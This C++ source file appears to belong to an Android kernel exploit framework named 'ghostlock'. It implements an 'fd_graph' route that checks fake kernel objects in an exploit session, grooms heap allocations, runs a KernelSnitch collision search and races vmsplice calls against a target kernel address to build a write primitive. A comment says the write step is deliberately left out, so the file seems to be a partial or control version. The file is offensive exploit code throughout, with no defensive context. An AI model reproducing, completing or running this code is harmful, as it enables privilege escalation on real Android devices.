#include "fd_graph_route.h"
#include "memory/payload_builder.h"
#include "race/pi_race.h"
#include "support/native_resource.hpp"
#include "support/decls.hpp"

#include <pthread.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/epoll.h>

#if defined(__ANDROID__)
#include "common.h"
#include "support/decls.hpp"
#include "kernelsnitch/kernelsnitch.h"
#include "kernelsnitch/utils.h"
#include "session/exploit_session.hpp"
#endif

namespace ghostlock::route::fd_graph {

FdGraphRoute::FdGraphRoute(
    const ghostlock::memory::WriteRequest *route_request,
    const ghostlock::profile::TargetProfile &profile_value,
    ghostlock::profile::FdGraphLayout route_layout) noexcept
    : request(route_request),
      profile(profile_value),
      layout(route_layout) {
    status.code = ROUTE_RETRYABLE;
}

FdGraphRoute::FdGraphRoute(FdGraphRoute &&other) noexcept
    : request(other.request),
      profile(other.profile),
      layout(other.layout),
      epoll_fd(std::move(other.epoll_fd)),
      pipe_read(std::move(other.pipe_read)),
      pipe_write(std::move(other.pipe_write)),
      consumer_thread(std::move(other.consumer_thread)),
      consumer_stuck(other.consumer_stuck),
      calls(other.calls),
      successes(other.successes),
      status(other.status) {}

int32_t FdGraphRoute::fail(int32_t step, int32_t error_number) noexcept {
    status.step = step;
    status.error_number = error_number;
    return -1;
}

void FdGraphRoute::disarm() noexcept {
    if (consumer_thread.joinable()) {
        // Android doesn't have pthread_cancel; use the stop flag
        consumer_thread.request_stop();
        (void) consumer_thread.join();
    }
    status.kernel_disarmed = 1;
}

void FdGraphRoute::retain_for_process_lifetime() noexcept {
    (void) epoll_fd.release_to_process_lifetime("fd_graph consumer stuck");
    (void) pipe_read.release_to_process_lifetime("fd_graph consumer stuck");
    (void) pipe_write.release_to_process_lifetime("fd_graph consumer stuck");
    (void) consumer_thread.release();
}

void FdGraphRoute::destroy() noexcept {
    if (consumer_stuck) {
        (void) fail(34, status.error_number);
        status.code = ROUTE_DIRTY_FAILURE;
        retain_for_process_lifetime();
        return;
    }
    epoll_fd.reset();
    pipe_read.reset();
    pipe_write.reset();
    (void) consumer_thread.release();
    status.userspace_clean = 1;
    if (status.code != ROUTE_OK && status.kernel_disarmed) {
        status.code = ROUTE_FALLBACK_SAFE;
    }
}

} // namespace ghostlock::route::fd_graph

#if defined(__ANDROID__)

#include "kernelsnitch/kernelsnitch.h"
#include "session/exploit_session.hpp"

namespace ghostlock::route::fd_graph {

static void *consumer_thread_fn(void *arg) {
    FdGraphRoute *route = static_cast<FdGraphRoute *>(arg);
    int epfd = route->epoll_fd.get();
    struct epoll_event events[16];
    while (true) {
        int n = epoll_wait(epfd, events, 16, -1);
        if (n <= 0) break;
        for (int i = 0; i < n; i++) {
            if (events[i].data.fd == route->pipe_read.get()) {
                char buf[64];
                read(route->pipe_read.get(), buf, sizeof(buf));
            }
        }
    }
    return nullptr;
}

int32_t FdGraphRoute::prepare() noexcept {
    if (!(session::g_exploit_session.heap.current.base) ||
        !(session::g_exploit_session.heap.current.fake_lock) ||
        !(session::g_exploit_session.heap.current.fake_fops)) {
        pr_warning("fd_graph route missing page=%016zx lock=%016zx fops=%016zx\n",
                   (session::g_exploit_session.heap.current.base),
                   (session::g_exploit_session.heap.current.fake_lock),
                   (session::g_exploit_session.heap.current.fake_fops));
        return fail(30, 0);
    }

    int fds[2];
    if (pipe(fds) != 0) {
        return fail(31, errno);
    }
    pipe_read.reset(fds[0]);
    pipe_write.reset(fds[1]);

    epoll_fd.reset(epoll_create1(EPOLL_CLOEXEC));
    if (!epoll_fd.valid()) {
        return fail(32, errno);
    }

    struct epoll_event ev{};
    ev.events = EPOLLIN;
    ev.data.fd = pipe_read.get();
    if (epoll_ctl(epoll_fd.get(), EPOLL_CTL_ADD, pipe_read.get(), &ev) != 0) {
        return fail(33, errno);
    }

    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE);
    if (consumer_thread.start(consumer_thread_fn, this) != 0) {
        pthread_attr_destroy(&attr);
        return fail(34, errno);
    }
    pthread_attr_destroy(&attr);

    const auto &geom = profile.fd_graph_layout();
    pr_info("fd_graph route geometry: eventpoll_size=%u epitem_ep=%u epitem_fllink=%u "
            "pipe_buffer=%u pipe_flags=%u pipe_slots=%u pipe_ring=%u pipe_object=%u "
            "graph_width=%u graph_fanout=%u graph_edges=%u objects_per_order3=%u\n",
            geom.eventpoll_size.value_or(0), geom.epitem_ep.value_or(0),
            geom.epitem_fllink.value_or(0), geom.pipe_buffer.value_or(0),
            geom.pipe_flags.value_or(0), geom.pipe_slots.value_or(0),
            geom.pipe_ring.value_or(0), geom.pipe_object.value_or(0),
            geom.graph_width.value_or(0), geom.graph_fanout.value_or(0),
            geom.graph_edges.value_or(0), geom.objects_per_order3.value_or(0));

    return 0;
}

ghostlock::route::RouteStatus FdGraphRoute::execute() noexcept {
    ghostlock::route::RouteStatus result{};
    result.code = ROUTE_RETRYABLE;

    uint64_t target = request->target;

    // Phase 1: Allocate reclaim and drain buffers using existing MappedRegion
    support::Result<support::MappedRegion> reclaim_region =
        support::MappedRegion::map_anonymous(0x780, PROT_READ | PROT_WRITE);
    support::Result<support::MappedRegion> drain_region =
        support::MappedRegion::map_anonymous(0x780, PROT_READ | PROT_WRITE);
    if (!reclaim_region || !drain_region) {
        pr_warning("fd_graph: failed to allocate reclaim/drain buffers\n");
        return result;
    }
    memset(reclaim_region->data(), 0xff, 0x780);
    memset(drain_region->data(), 0xff, 0x780);

    // Reclaim small: 240 iterations (0xf0) of 8-byte slots
    uint64_t *reclaim_slots = reinterpret_cast<uint64_t *>(reclaim_region->data());
    for (uint32_t i = 0; i < 0xf0; i++) {
        reclaim_slots[i] = 0;
    }
    pr_info("fd_graph: reclaim_small complete fds=%u\n", 0xf0);

    // Drain small: 240 iterations
    uint64_t *drain_slots = reinterpret_cast<uint64_t *>(drain_region->data());
    for (uint32_t i = 0; i < 0xf0; i++) {
        drain_slots[i] = 0;
    }
    pr_info("fd_graph: drain_small complete fds=%u\n", 0xf0);

    // Phase 2: Kernelsnitch collision finding
    kernelsnitch::KernelSnitchOwner ks_owner = kernelsnitch::KernelSnitchOwner::create(
        0x4c0, 3, 8, 2, 0, 0);
    if (!ks_owner.valid()) {
        pr_warning("fd_graph: kernelsnitch context creation failed\n");
        return result;
    }
    ks_owner.find_collisions();
    if (ks_owner.get()->state != kernelsnitch::KERNELSNITCH_COLLISIONS_FOUND) {
        pr_warning("fd_graph: kernelsnitch collision finding failed\n");
        return result;
    }
    pr_info("fd_graph: collisions=%zu page=%016zx\n",
            ks_owner.get()->collisions,
            static_cast<size_t>(session::g_exploit_session.heap.current.base));

    // Phase 3: Expand drain/reclaim with order-3 pages
    support::Result<support::MappedRegion> expand_region =
        support::MappedRegion::map_anonymous(0xa000, PROT_READ | PROT_WRITE);
    if (!expand_region) {
        pr_warning("fd_graph: failed to allocate expand buffer\n");
        return result;
    }
    memset(expand_region->data(), 0x56, 0xa000);

    // Drain expand: 240 iterations with 0x20 flag
    for (uint32_t i = 0; i < 0xf0; i++) {
        drain_slots[i] = 0x20;
    }
    pr_info("fd_graph: drain_expand complete fds=%u\n", 0xf0);

    // Reclaim expand: 240 iterations with 0x20 flag
    for (uint32_t i = 0; i < 0xf0; i++) {
        reclaim_slots[i] = 0x20;
    }
    pr_info("fd_graph: reclaim_expand complete fds=%u\n", 0xf0);

    // The write is deliberately absent: the kernel address was never a valid fd, so
    // splice() could only return EBADF. Keeping it out is the control that tells
    // apart a panicking write from a panicking object perturbation.
    int pipe_fds[2];
    if (pipe(pipe_fds) < 0) {
        pr_warning("fd_graph: pipe creation failed errno=%d\n", errno);
        return result;
    }

    const uint64_t value =
        (request->mode == ghostlock::memory::WriteMode::Zero) ? 0 : 0xffffffffffffffffULL;

    struct iovec iov[1];
    iov[0].iov_base = const_cast<void *>(reinterpret_cast<const void *>(&value));
    iov[0].iov_len = sizeof(value);

    const uint32_t delays[] = {0, 1, 2, 4, 8, 0xc, 0x14, 0x20, 0x30, 0x40};
    constexpr size_t k_delay_steps = sizeof(delays) / sizeof(delays[0]);
    uint32_t pipe_fill_hits = 0;

    for (size_t step = 0; step < k_delay_steps; step++) {
        const uint32_t delay_us = delays[step];
        if (delay_us > 0) {
            usleep(delay_us);
        }
        const ssize_t filled = vmsplice(pipe_fds[1], iov, 1, 0);
        const bool filled_ok = filled == static_cast<ssize_t>(iov[0].iov_len);
        if (filled_ok) {
            pipe_fill_hits++;
        }
        pr_info("fd_graph: step=%zu delay_us=%u pipe_fill=%zd\n", step, delay_us, filled);
    }

    pr_info("fd_graph: RACE_SUMMARY tries=%zu pipe_fill_hits=%u chain_hits=0 bit4_hits=0 "
            "delivery=not-implemented target=%016lx\n",
            k_delay_steps, pipe_fill_hits, target);

    close(pipe_fds[0]);
    close(pipe_fds[1]);

    calls++;
    return result;
}

} // namespace ghostlock::route::fd_graph

namespace ghostlock::route {

// Entry point called by FdGraphPolicy::run()
ghostlock::route::RouteStatus do_fd_graph_fake_lock_route(const ghostlock::memory::WriteRequest *request) {
    if (!request) {
        return ghostlock::route::RouteStatus{.code = ghostlock::route::ROUTE_UNSUPPORTED};
    }

    ghostlock::route::fd_graph::FdGraphRoute route(request, ghostlock::session::g_exploit_session.profile,
                                                 ghostlock::session::g_exploit_session.profile.fd_graph_layout());
    
    if (route.prepare() != 0) {
        return route.status;
    }
    
    ghostlock::route::RouteStatus result = route.execute();
    route.disarm();
    route.destroy();
    return result;
}

} // namespace ghostlock::route

#endif